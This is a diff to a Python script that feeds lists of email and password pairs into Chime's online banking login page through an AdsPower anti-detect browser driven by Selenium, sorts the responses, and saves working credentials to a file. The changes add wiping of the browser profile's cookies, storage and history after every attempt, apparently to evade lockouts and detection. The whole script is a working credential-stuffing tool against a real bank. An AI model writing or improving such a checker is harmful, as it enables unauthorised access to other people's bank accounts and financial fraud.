@@ -38,8 +38,8 @@ def load_settings():
 
 ADSPOWER_API_KEY, ADSPOWER_BASE_URL, PROFILE_ID, WAIT_TIME, SIGN_IN_WAIT = load_settings()
 EMAIL_FILE = BASE_DIR / "email.txt"
-FOUND_FILE = BASE_DIR / "found.txt"
-MOBILE_VERIFY_FILE = BASE_DIR / "mobile_verify.txt"
+SUCCESS_FILE = BASE_DIR / "success.txt"
+CUSTOM_FILE = BASE_DIR / "custom.txt"
 LOG_FILE = BASE_DIR / "log.txt"
 TARGET_URL = "https://app.chime.com/login"
 
@@ -51,7 +51,17 @@ BLOCKED_TEXT = "You have exceeded the maximum number of login attempts"
 INCORRECT_TEXT = "do not match our records"
 MOBILE_VERIFY_TEXT = "try logging in on your chime mobile app"
 TRY_AGAIN_TEXT = "please try again, and contact us at (844) 244-6363"
-CHIME_ORIGINS = ("https://app.chime.com", "https://chime.com")
+NO_DEPOSIT_ACCOUNT_TEXT = (
+    "you cannot access the chime app since we were unable to open  a chime deposite account for you"
+)
+CACHE_TYPES = [
+    "local_storage",
+    "indexeddb",
+    "extension_cache",
+    "cookie",
+    "history",
+    "image_file",
+]
 
 
 def log(message):
@@ -86,13 +96,72 @@ def load_credentials(path):
     return credentials
 
 
-def clear_chime_cache(driver):
-    for origin in CHIME_ORIGINS:
-        driver.execute_cdp_cmd(
-            "Storage.clearDataForOrigin",
-            {"origin": origin, "storageTypes": "all"},
-        )
-    log("Chime website cache cleared")
+def adspower_request(method, path, **kwargs):
+    url = f"{ADSPOWER_BASE_URL}{path}"
+    headers = {"Authorization": f"Bearer {ADSPOWER_API_KEY}"}
+    for attempt in range(3):
+        response = requests.request(method, url, headers=headers, **kwargs).json()
+        if response.get("msg") != "Too many request per second, please check":
+            return response
+        log("AdsPower rate limit hit, retrying...")
+        time.sleep(1)
+    return response
+
+
+def connect_browser():
+    response = adspower_request("GET", "/api/v1/browser/start", params={"user_id": PROFILE_ID})
+    if response["code"] != 0:
+        log(f"AdsPower error: {response}")
+        raise Exception(response)
+
+    chrome_options = Options()
+    chrome_options.add_experimental_option("debuggerAddress", response["data"]["ws"]["selenium"])
+    driver = webdriver.Chrome(
+        service=Service(response["data"]["webdriver"]),
+        options=chrome_options,
+    )
+
+    driver.switch_to.new_window("tab")
+    target_handle = driver.current_window_handle
+    for handle in driver.window_handles:
+        if handle == target_handle:
+            continue
+        driver.switch_to.window(handle)
+        driver.close()
+    driver.switch_to.window(target_handle)
+    return driver
+
+
+def stop_browser(driver):
+    try:
+        driver.quit()
+    except Exception:
+        pass
+
+    response = adspower_request("GET", "/api/v1/browser/stop", params={"user_id": PROFILE_ID})
+    if response["code"] != 0:
+        log(f"AdsPower stop error: {response}")
+    else:
+        log("AdsPower browser stopped")
+
+
+def clear_profile_cache(driver):
+    log("Clearing profile cache via AdsPower API...")
+    stop_browser(driver)
+    time.sleep(1)
+
+    response = adspower_request(
+        "POST",
+        "/api/v2/browser-profile/delete-cache",
+        json={"profile_id": [PROFILE_ID], "type": CACHE_TYPES},
+    )
+    if response["code"] != 0:
+        log(f"AdsPower delete-cache error: {response}")
+    else:
+        log("Profile cache cleared")
+
+    log("Restarting AdsPower browser...")
+    return connect_browser()
 
 
 def remove_credential(path, email, password):
@@ -121,6 +190,8 @@ def detect_login_result(browser):
         return "mobile verify"
     if TRY_AGAIN_TEXT in page:
         return "try again"
+    if NO_DEPOSIT_ACCOUNT_TEXT in page:
+        return "no deposit account"
     if VERIFICATION_TEXT in browser.page_source:
         return "found"
     return False
@@ -149,49 +220,9 @@ check_expiry(EXPIRY_DATE)
 log("Script started")
 log(f"Using profile: {PROFILE_ID}")
 
-url = f"{ADSPOWER_BASE_URL}/api/v1/browser/start"
-params = {"user_id": PROFILE_ID}
-
 log("Starting AdsPower browser profile...")
-for attempt in range(3):
-    response = requests.get(
-        url,
-        params=params,
-        headers={"Authorization": f"Bearer {ADSPOWER_API_KEY}"},
-    ).json()
-    if response.get("msg") != "Too many request per second, please check":
-        break
-    log("AdsPower rate limit hit, retrying...")
-    time.sleep(1)
-
-if response["code"] != 0:
-    log(f"AdsPower error: {response}")
-    raise Exception(response)
-
+driver = connect_browser()
 log("AdsPower profile started successfully")
-
-webdriver_path = response["data"]["webdriver"]
-debug_address = response["data"]["ws"]["selenium"]
-
-chrome_options = Options()
-chrome_options.add_experimental_option("debuggerAddress", debug_address)
-
-log("Connecting to browser...")
-driver = webdriver.Chrome(
-    service=Service(webdriver_path),
-    options=chrome_options
-)
-
-driver.switch_to.new_window("tab")
-target_handle = driver.current_window_handle
-
-for handle in driver.window_handles:
-    if handle == target_handle:
-        continue
-    driver.switch_to.window(handle)
-    driver.close()
-
-driver.switch_to.window(target_handle)
 wait = WebDriverWait(driver, WAIT_TIME)
 long_wait = WebDriverWait(driver, 90)
 
@@ -212,13 +243,13 @@ while True:
         result = check_account(driver, email, password, wait, long_wait)
         log(f"{email}: {result}")
         if result == "found":
-            save_account(FOUND_FILE, email, password)
-            log(f"{email}: saved to {FOUND_FILE.name}")
-        elif result == "mobile verify":
-            save_account(MOBILE_VERIFY_FILE, email, password)
-            log(f"{email}: saved to {MOBILE_VERIFY_FILE.name}")
-        elif result == "try again":
-            clear_chime_cache(driver)
+            save_account(SUCCESS_FILE, email, password)
+            log(f"{email}: saved to {SUCCESS_FILE.name}")
+        elif result == "incorrect":
+            log(f"{email}: incorrect password, not saved")
+        elif result:
+            save_account(CUSTOM_FILE, email, password)
+            log(f"{email}: saved to {CUSTOM_FILE.name}")
     except TimeoutException:
         log(f"{email}: login result not found")
     except Exception as error:
@@ -226,5 +257,8 @@ while True:
     finally:
         remove_credential(EMAIL_FILE, email, password)
         log(f"{email}: removed from {EMAIL_FILE.name}")
+        driver = clear_profile_cache(driver)
+        wait = WebDriverWait(driver, WAIT_TIME)
+        long_wait = WebDriverWait(driver, 90)
 
 log("Script finished")
